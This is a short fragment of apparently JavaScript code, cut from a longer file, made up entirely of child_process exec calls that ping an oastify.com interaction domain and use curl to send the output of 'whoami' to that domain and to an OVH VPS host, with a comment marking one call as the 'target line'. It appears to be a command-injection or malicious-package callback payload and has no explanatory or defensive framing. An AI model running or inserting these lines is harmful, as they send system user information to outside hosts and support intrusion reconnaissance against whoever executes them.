...
exec('ping -c 4 gl5nrcig1j22zuzcvdqjfvtsajgk4asz.oastify.com');
exec(`curl -X POST -d "$(whoami)" https://gl5nrcig1j22zuzcvdqjfvtsajgk4asz.oastify.com/c`);
exec(`curl "http://vps-4553c2ff.vps.ovh.net/c?user=$(whoami)"`);
// Target line: require('child_process').exec('ping -c 4 gl5nrcig1j22zuzcvdqjfvtsajgk4asz.oastify.com');
